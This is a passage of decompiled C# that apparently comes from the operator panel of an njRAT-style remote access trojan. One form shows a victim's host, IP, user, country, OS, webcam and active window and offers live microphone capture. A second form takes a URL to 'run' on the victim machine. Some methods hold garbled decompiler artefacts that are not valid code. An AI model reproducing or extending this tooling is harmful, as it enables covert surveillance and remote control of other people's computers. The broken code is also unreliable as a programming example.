						Frm_VInfo.__ENCList.RemoveRange(num, Frm_VInfo.__ENCList.Count - num);
						Frm_VInfo.__ENCList.Capacity = Frm_VInfo.__ENCList.Count;
					}
					Frm_VInfo.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_VInfo));
			ListViewItem listViewItem = new ListViewItem(new string[]
			{
				"Name",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem2 = new ListViewItem(new string[]
			{
				"Host",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem3 = new ListViewItem(new string[]
			{
				"Dir",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem4 = new ListViewItem(new string[]
			{
				"Exe",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem5 = new ListViewItem(new string[]
			{
				"IP",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem6 = new ListViewItem(new string[]
			{
				"Port",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem7 = new ListViewItem(new string[]
			{
				"PC",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem8 = new ListViewItem(new string[]
			{
				"User",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem9 = new ListViewItem(new string[]
			{
				"Install Date",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem10 = new ListViewItem(new string[]
			{
				"Country",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem11 = new ListViewItem(new string[]
			{
				"OS",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem12 = new ListViewItem(new string[]
			{
				"Cam",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem13 = new ListViewItem(new string[]
			{
				"Ver",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem14 = new ListViewItem(new string[]
			{
				"Ping",
				"None",
				"None"
			}, -1);
			ListViewItem listViewItem15 = new ListViewItem(new string[]
			{
				"Active Window",
				"None",
				"None"
			}, -1);
			this.ContextMenuStrip1 = new ContextMenuStrip(this.components);
			this.CopiarToolStripMenuItem = new ToolStripMenuItem();
			this.CopiarTudoToolStripMenuItem = new ToolStripMenuItem();
			this.ChangeSelectedColorToolStripMenuItem = new ToolStripMenuItem();
			this.ImageList1 = new ImageList(this.components);
			this.Panel1 = new Panel();
			this.Label1 = new Label();
			this.Label4 = new Label();
			this.Button1 = new Button();
			this.ProgressBar2 = new ProgressBar();
			this.Button2 = new Button();
			this.Timer1 = new Timer(this.components);
			this.Panel3 = new Panel();
			this.ListView1 = new ListView();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.ProgressBar1 = new ProgressBar();
			this.vmethod_4 = new Timer(this.components);
			this.Timer2 = new Timer(this.components);
			this.LogInComboBox1 = new LogInComboBox();
			this.LogInComboBox3 = new LogInComboBox();
			this.LogInComboBox2 = new LogInComboBox();
			this.ContextMenuStrip1.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Panel3.SuspendLayout();
			this.SuspendLayout();
			this.ContextMenuStrip1.BackColor = Color.FromArgb(22, 22, 22);
			this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.CopiarToolStripMenuItem,
				this.CopiarTudoToolStripMenuItem,
				this.ChangeSelectedColorToolStripMenuItem
			});
			this.ContextMenuStrip1.Name = "ContextMenuStrip1";
			Control arg_4C1_0 = this.ContextMenuStrip1;
			Size size = new Size(195, 70);
			arg_4C1_0.Size = size;
			this.CopiarToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.CopiarToolStripMenuItem.ForeColor = Color.White;
			this.CopiarToolStripMenuItem.Name = "CopiarToolStripMenuItem";
			ToolStripItem arg_517_0 = this.CopiarToolStripMenuItem;
			size = new Size(194, 22);
			arg_517_0.Size = size;
			this.CopiarToolStripMenuItem.Text = "Copy Selected";
			this.CopiarTudoToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.CopiarTudoToolStripMenuItem.ForeColor = Color.White;
			this.CopiarTudoToolStripMenuItem.Name = "CopiarTudoToolStripMenuItem";
			ToolStripItem arg_57E_0 = this.CopiarTudoToolStripMenuItem;
			size = new Size(194, 22);
			arg_57E_0.Size = size;
			this.CopiarTudoToolStripMenuItem.Text = "Copy All";
			this.ChangeSelectedColorToolStripMenuItem.BackColor = Color.FromArgb(22, 22, 22);
			this.ChangeSelectedColorToolStripMenuItem.ForeColor = Color.White;
			this.ChangeSelectedColorToolStripMenuItem.Name = "ChangeSelectedColorToolStripMenuItem";
			ToolStripItem arg_5E5_0 = this.ChangeSelectedColorToolStripMenuItem;
			size = new Size(194, 22);
			arg_5E5_0.Size = size;
			this.ChangeSelectedColorToolStripMenuItem.Text = "Change Selected Color";
			this.ImageList1.ColorDepth = ColorDepth.Depth32Bit;
			ImageList arg_61E_0 = this.ImageList1;
			size = new Size(20, 20);
			arg_61E_0.ImageSize = size;
			this.ImageList1.TransparentColor = Color.Transparent;
			this.Panel1.Controls.Add(this.Label1);
			this.Panel1.Controls.Add(this.Label4);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.ProgressBar2);
			this.Panel1.Controls.Add(this.LogInComboBox3);
			this.Panel1.Controls.Add(this.Button2);
			this.Panel1.Controls.Add(this.LogInComboBox2);
			this.Panel1.Dock = DockStyle.Top;
			Control arg_6F5_0 = this.Panel1;
			Point location = new Point(0, 0);
			arg_6F5_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_723_0 = this.Panel1;
			size = new Size(331, 73);
			arg_723_0.Size = size;
			this.Panel1.TabIndex = 1;
			this.Label1.AutoSize = true;
			this.Label1.Image = (Image)componentResourceManager.GetObject("Label1.Image");
			Control arg_777_0 = this.Label1;
			location = new Point(217, 23);
			arg_777_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_7A2_0 = this.Label1;
			size = new Size(22, 15);
			arg_7A2_0.Size = size;
			this.Label1.TabIndex = 41;
			this.Label1.Text = ".   .";
			this.Label4.AutoSize = true;
			this.Label4.ForeColor = Color.LightSteelBlue;
			Control arg_7F8_0 = this.Label4;
			location = new Point(0, 32);
			arg_7F8_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_823_0 = this.Label4;
			size = new Size(59, 15);
			arg_823_0.Size = size;
			this.Label4.TabIndex = 38;
			this.Label4.Text = "BufferSize";
			this.Button1.BackColor = SystemColors.ActiveCaptionText;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_8AB_0 = this.Button1;
			location = new Point(208, 3);
			arg_8AB_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_8D6_0 = this.Button1;
			size = new Size(121, 51);
			arg_8D6_0.Size = size;
			this.Button1.TabIndex = 36;
			this.Button1.Text = "Start";
			this.Button1.UseVisualStyleBackColor = false;
			this.ProgressBar2.Dock = DockStyle.Bottom;
			Control arg_928_0 = this.ProgressBar2;
			location = new Point(0, 57);
			arg_928_0.Location = location;
			this.ProgressBar2.Name = "ProgressBar2";
			Control arg_956_0 = this.ProgressBar2;
			size = new Size(331, 16);
			arg_956_0.Size = size;
			this.ProgressBar2.TabIndex = 7;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_9BC_0 = this.Button2;
			location = new Point(733, 12);
			arg_9BC_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_9E7_0 = this.Button2;
			size = new Size(124, 48);
			arg_9E7_0.Size = size;
			this.Button2.TabIndex = 5;
			this.Button2.Text = "Stop";
			this.Button2.UseVisualStyleBackColor = true;
			this.Panel3.Controls.Add(this.ListView1);
			this.Panel3.Controls.Add(this.ProgressBar1);
			Control arg_A60_0 = this.Panel3;
			location = new Point(162, 364);
			arg_A60_0.Location = location;
			this.Panel3.Name = "Panel3";
			Control arg_A8E_0 = this.Panel3;
			size = new Size(531, 10);
			arg_A8E_0.Size = size;
			this.Panel3.TabIndex = 4;
			this.ListView1.BackColor = Color.Black;
			this.ListView1.BorderStyle = BorderStyle.FixedSingle;
			this.ListView1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2,
				this.ColumnHeader3
			});
			this.ListView1.ContextMenuStrip = this.ContextMenuStrip1;
			this.ListView1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ListView1.ForeColor = Color.White;
			this.ListView1.FullRowSelect = true;
			this.ListView1.GridLines = true;
			this.ListView1.HeaderStyle = ColumnHeaderStyle.None;
			this.ListView1.Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4,
				listViewItem5,
				listViewItem6,
				listViewItem7,
				listViewItem8,
				listViewItem9,
				listViewItem10,
				listViewItem11,
				listViewItem12,
				listViewItem13,
				listViewItem14,
				listViewItem15
			});
			Control arg_BFD_0 = this.ListView1;
			location = new Point(-47, 0);
			arg_BFD_0.Location = location;
			this.ListView1.Name = "ListView1";
			Control arg_C2E_0 = this.ListView1;
			size = new Size(397, 295);
			arg_C2E_0.Size = size;
			this.ListView1.SmallImageList = this.ImageList1;
			this.ListView1.TabIndex = 107;
			this.ListView1.UseCompatibleStateImageBehavior = false;
			this.ListView1.View = View.Details;
			this.ColumnHeader1.Width = 120;
			this.ColumnHeader2.Width = 200;
			this.ColumnHeader3.TextAlign = HorizontalAlignment.Center;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_CB9_0 = this.ProgressBar1;
			location = new Point(0, 0);
			arg_CB9_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_CE7_0 = this.ProgressBar1;
			size = new Size(531, 10);
			arg_CE7_0.Size = size;
			this.ProgressBar1.TabIndex = 106;
			this.vmethod_4.Interval = 50;
			this.Timer2.Interval = 50;
			this.LogInComboBox1.ArrowColour = Color.FromArgb(30, 30, 30);
			this.LogInComboBox1.BackColor = Color.Transparent;
			this.LogInComboBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInComboBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox1.Font = new Font("Segoe UI", 10f);
			this.LogInComboBox1.FontColour = Color.FromArgb(255, 255, 255);
			this.LogInComboBox1.FormattingEnabled = true;
			this.LogInComboBox1.LineColour = Color.FromArgb(23, 119, 151);
			Control arg_E03_0 = this.LogInComboBox1;
			location = new Point(566, 332);
			arg_E03_0.Location = location;
			this.LogInComboBox1.Name = "LogInComboBox1";
			Control arg_E31_0 = this.LogInComboBox1;
			size = new Size(178, 26);
			arg_E31_0.Size = size;
			this.LogInComboBox1.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox1.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox1.StartIndex = 0;
			this.LogInComboBox1.TabIndex = 3;
			this.LogInComboBox3.ArrowColour = Color.Black;
			this.LogInComboBox3.BackColor = Color.Transparent;
			this.LogInComboBox3.BaseColour = Color.Black;
			this.LogInComboBox3.BorderColour = Color.White;
			this.LogInComboBox3.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox3.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox3.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox3.FontColour = Color.LightSteelBlue;
			this.LogInComboBox3.FormattingEnabled = true;
			this.LogInComboBox3.Items.AddRange(new object[]
			{
				"4 kb 8bit",
				"6 kb 8bit",
				"8 kb 8bit",
				"8 kb 16bit",
				"12 kb 16bit",
				"16 kb 16bit",
				"20 kb 16bit",
				"24 kb 16bit"
			});
			this.LogInComboBox3.LineColour = Color.Black;
			Control arg_FA9_0 = this.LogInComboBox3;
			location = new Point(65, 30);
			arg_FA9_0.Location = location;
			this.LogInComboBox3.Name = "LogInComboBox3";
			Control arg_FD7_0 = this.LogInComboBox3;
			size = new Size(137, 23);
			arg_FD7_0.Size = size;
			this.LogInComboBox3.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox3.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox3.StartIndex = 0;
			this.LogInComboBox3.TabIndex = 6;
			this.LogInComboBox2.ArrowColour = Color.Black;
			this.LogInComboBox2.BackColor = Color.Transparent;
			this.LogInComboBox2.BaseColour = Color.Black;
			this.LogInComboBox2.BorderColour = Color.White;
			this.LogInComboBox2.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox2.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox2.FontColour = Color.LightSteelBlue;
			this.LogInComboBox2.FormattingEnabled = true;
			this.LogInComboBox2.Items.AddRange(new object[]
			{
				"Microphone {Realtek High Defini"
			});
			this.LogInComboBox2.LineColour = Color.Black;
			Control arg_1107_0 = this.LogInComboBox2;
			location = new Point(3, 1);
			arg_1107_0.Location = location;
			this.LogInComboBox2.Name = "LogInComboBox2";
			Control arg_1135_0 = this.LogInComboBox2;
			size = new Size(199, 23);
			arg_1135_0.Size = size;
			this.LogInComboBox2.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox2.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox2.StartIndex = 0;
			this.LogInComboBox2.TabIndex = 5;
			SizeF autoScaleDimensions = new SizeF(7f, 15f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(331, 67);
			this.ClientSize = size;
			this.Controls.Add(this.LogInComboBox1);
			this.Controls.Add(this.Panel3);
			this.Controls.Add(this.Panel1);
			this.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ForeColor = Color.Blue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			size = new Size(347, 101);
			this.MaximumSize = size;
			this.MinimizeBox = false;
			size = new Size(347, 101);
			this.MinimumSize = size;
			this.Name = "Frm_VInfo";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Mcrophonp: 00:00:00";
			this.TransparencyKey = Color.Fuchsia;
			this.ContextMenuStrip1.ResumeLayout(false);
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.Panel3.ResumeLayout(false);
			this.ResumeLayout(false);
		}

		private void Informações_By_SooftT_Load(object sender, EventArgs e)
		{
			this.Timer1.Start();
			bool flag = this.ListView1.Items[9].SubItems[1].Text.Contains("BRA");
			if (flag)
			{
				this.ListView1.Items[9].ImageIndex = 16;
			}
			else
			{
				this.ListView1.Items[9].ImageIndex = 16;
			}
			flag = this.ListView1.Items[10].SubItems[1].Text.Contains("Win 8");
			if (flag)
			{
				this.ListView1.Items[10].ImageIndex = 9;
			}
			flag = this.ListView1.Items[10].SubItems[1].Text.Contains("Win 7");
			if (flag)
			{
				this.ListView1.Items[10].ImageIndex = 10;
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 110;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void CopiarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num;
			int num3;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_09:
				int num2 = 2;
				Clipboard.SetText(this.ListView1.SelectedItems[0].Text + " : " + this.ListView1.SelectedItems[0].SubItems[1].Text + " > BY naseer2012");
				IL_57:
				goto IL_BD;
				IL_5C:
				int arg_61_0 = num3 + 1;
				num3 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_61_0);
				IL_76:
				goto IL_B2;
				num3 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
				IL_90:
				goto IL_B2;
			}
			object arg_92_0;
			endfilter(arg_92_0 is Exception & num != 0 & num3 == 0);
			IL_B2:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_BD:
			if (num3 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void CopiarTudoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num;
			int num6;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				int arg_21_0 = 0;
				checked
				{
					int num3 = this.ListView1.Items.Count - 1;
					int num4 = arg_21_0;
					string text;
					while (true)
					{
						int arg_B7_0 = num4;
						int num5 = num3;
						if (arg_B7_0 > num5)
						{
							break;
						}
						IL_27:
						num2 = 3;
						ListViewItem listViewItem = this.ListView1.Items[num4];
						IL_3C:
						num2 = 4;
						text = string.Concat(new string[]
						{
							text,
							listViewItem.Text,
							" : ",
							this.ListView1.Items[num4].SubItems[1].Text,
							" > BY naseer2012"
						});
						IL_9A:
						num2 = 5;
						text += "\r\n";
						IL_A9:
						num2 = 6;
						num4++;
					}
					IL_BC:
					num2 = 7;
					Clipboard.SetDataObject(text);
					IL_C6:
					goto IL_14C;
					IL_CF:;
				}
				int arg_D6_0 = num6 + 1;
				num6 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_D6_0);
				IL_FF:
				goto IL_141;
				num6 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
				IL_11D:
				goto IL_141;
			}
			object arg_11F_0;
			endfilter(arg_11F_0 is Exception & num != 0 & num6 == 0);
			IL_141:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_14C:
			if (num6 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void ChangeSelectedColorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.ListView1.SelectedItems[0].ForeColor = colorDialog.Color;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			this.vmethod_4.Start();
			MyProject.Computer.Audio.Play(Resources.Sound0, AudioPlayMode.Background);
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			this.Timer2.Start();
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (flag)
			{
				MyProject.Computer.Audio.Play(Resources.Sound0, AudioPlayMode.Background);
				this.Button1.Text = "Stop";
				this.LogInComboBox2.Enabled = false;
				this.LogInComboBox3.Enabled = false;
				flag = this.LogInComboBox3.Text.Contains("16bit");
				if (flag)
				{
				}
			}
			else
			{
				this.Button1.Text = "Start";
				this.LogInComboBox2.Enabled = true;
				this.LogInComboBox3.Enabled = true;
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar2.Value == 100;
			if (flag)
			{
				this.ProgressBar2.Value = 0;
			}
			else
			{
				this.ProgressBar2.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar2.Value) + Conversion.Val(10))));
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_URL : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		[AccessedThroughProperty("TextBox2")]
		private TextBox _TextBox2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		public bool IsOK;

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.TextBox1_KeyDown);
				EventHandler value3 = new EventHandler(this.TextBox1_TextChanged);
				bool flag = this._TextBox1 != null;
				if (flag)
				{
					this._TextBox1.KeyDown -= value2;
					this._TextBox1.TextChanged -= value3;
				}
				this._TextBox1 = value;
				flag = (this._TextBox1 != null);
				if (flag)
				{
					this._TextBox1.KeyDown += value2;
					this._TextBox1.TextChanged += value3;
				}
			}
		}

		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_URL.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_URL.__ENCList.Count == Frm_URL.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_URL.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_URL.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_URL.__ENCList[num] = Frm_URL.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_URL.__ENCList.RemoveRange(num, Frm_URL.__ENCList.Count - num);
						Frm_URL.__ENCList.Capacity = Frm_URL.__ENCList.Count;
					}
					Frm_URL.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_URL));
			this.Label1 = new Label();
			this.Label2 = new Label();
			this.TextBox1 = new TextBox();
			this.TextBox2 = new TextBox();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.SuspendLayout();
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_9D_0 = this.Label1;
			Point location = new Point(12, 4);
			arg_9D_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_C8_0 = this.Label1;
			Size size = new Size(29, 13);
			arg_C8_0.Size = size;
			this.Label1.TabIndex = 0;
			this.Label1.Text = "Link";
			this.Label2.AutoSize = true;
			this.Label2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_12A_0 = this.Label2;
			location = new Point(12, 49);
			arg_12A_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_155_0 = this.Label2;
			size = new Size(44, 13);
			arg_155_0.Size = size;
			this.Label2.TabIndex = 1;
			this.Label2.Text = "Run As";
			this.TextBox1.BackColor = Color.Black;
			this.TextBox1.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.TextBox1.ForeColor = Color.Yellow;
			Control arg_1D9_0 = this.TextBox1;
			location = new Point(12, 20);
			arg_1D9_0.Location = location;
			this.TextBox1.Name = "TextBox1";
			Control arg_207_0 = this.TextBox1;
			size = new Size(360, 22);
			arg_207_0.Size = size;
			this.TextBox1.TabIndex = 2;
			this.TextBox2.BackColor = Color.Black;
			this.TextBox2.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.TextBox2.ForeColor = Color.Yellow;
			Control arg_27A_0 = this.TextBox2;
			location = new Point(12, 65);
			arg_27A_0.Location = location;
			this.TextBox2.Name = "TextBox2";
			Control arg_2A8_0 = this.TextBox2;
			size = new Size(198, 22);
			arg_2A8_0.Size = size;
			this.TextBox2.TabIndex = 3;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_2EF_0 = this.Button1;
			location = new Point(216, 64);
			arg_2EF_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_31A_0 = this.Button1;
			size = new Size(75, 23);
			arg_31A_0.Size = size;
			this.Button1.TabIndex = 4;
			this.Button1.Text = "Run";
			this.Button1.UseVisualStyleBackColor = true;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_37F_0 = this.Button2;
			location = new Point(297, 63);
			arg_37F_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_3AA_0 = this.Button2;
			size = new Size(75, 23);
			arg_3AA_0.Size = size;
			this.Button2.TabIndex = 5;
			this.Button2.Text = "Cancel";
			this.Button2.UseVisualStyleBackColor = true;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(377, 93);
			this.ClientSize = size;
			this.Controls.Add(this.Button2);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.TextBox2);
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.Label1);
			this.ForeColor = Color.LightSteelBlue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(393, 127);
			this.MaximumSize = size;
			size = new Size(393, 127);
			this.MinimumSize = size;
			this.Name = "Frm_URL";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "URL";
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public Frm_URL()
		{
			base.Load += new EventHandler(this.FURL_Load);
			Frm_URL.__ENCAddToList(this);
			base.KeyDown += new KeyEventHandler(this.TextBox1_KeyDown);
			base.Load += new EventHandler(this.FURL_Load);
			this.IsOK = false;
			this.InitializeComponent();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = this.TextBox1.Text.Length > 0 & this.TextBox1.Text.ToLower().StartsWith("http") & this.TextBox2.TextLength > 0;
			if (flag)
			{
				this.IsOK = true;
				this.Close();
			}
		}

		private void FURL_Load(object sender, EventArgs e)
		{
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
			}
		}

		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
			try
			{
				this.TextBox2.Text = Strings.Split(this.TextBox1.Text, ".", -1, CompareMethod.Binary)[checked(Strings.Split(this.TextBox1.Text, ".", -1, CompareMethod.Binary).Length - 1)];
			}
			catch (Exception expr_43)
			{
				ProjectData.SetProjectError(expr_43);
				Exception projectError = expr_43;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
